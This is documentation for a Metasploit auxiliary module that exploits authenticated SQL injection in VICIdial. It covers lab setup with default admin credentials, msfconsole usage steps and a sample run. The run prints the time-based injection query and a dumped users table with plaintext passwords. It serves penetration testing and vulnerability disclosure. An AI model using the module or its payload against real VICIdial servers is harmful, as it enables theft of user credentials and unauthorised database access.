This module exploits several authenticated SQL Inject vulnerabilities in VICIdial 2.14b0.5 prior to
svn/trunk revision 3555 (VICIBox 10.0.0, prior to January 20 is vulnerable)

## Vulnerable Application

1. Install the following OpenSUSE 10 ISO [ViciBox_v9.x86_64-9.0.3.iso](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9.x86_64-9.0.3.iso):
    1. Change the default password
    1. Set Timezone, Keyboard Layout and Language
    1. Network settings should autoconfigure (Tested on VMware Fusion). Network settings can be configured with the 
        command `yast lan` if necessary
1. Run `vicibox-express` to initiate the ViciDial Express Installation, everything can be kept as default
1. Navigate to `http://<ip-address>/` 
    1. Click `Administration` and login with default credentials username: `6666`, password: `1234`
    1. Once logged in, Click "Finish setup". Everything can be kept as default. 
1. The complete list of setup instructions can be found by following this [link](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9-install.pdf)
    

## Verification Steps

1. Start msfconsole
1. Do: ```use auxiliary/scanner/http/vicidial_multiple_sqli```
1. Do: ```set username <username>```
1. Do: ```set password <password>```
1. Do ```show actions```
   1. Select from the list or keep the default
1. Do: ```run```
1. The module will exploit the selected SQL injection and return the extracted usernames and passwords

## Scenarios

ViciBox_v9.x86_64-9.0.3 using the List Users - modify_email_accounts method:
  ```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - modify_email_accounts method
action => List Users - modify_email_accounts method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(TXMlUAF) from (select cast(concat_ws(';',ifnull(user,''),ifnull(pass,'')) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
[*] {SQLi} Encoded to (select group_concat(TXMlUAF) from (select cast(concat_ws(0x3b,ifnull(user,repeat(0x87,0)),ifnull(pass,repeat(0x52,0))) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
[*] {SQLi} Time-based injection: expecting output of length 46
[!] No active DB -- Credential data will not be saved!
[+] Dumped table contents:
vicidial_users
==============

 user  pass
 ----  ----
 6666  notpassword
 VDAD  donotedit
 VDCL  donotedit

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```
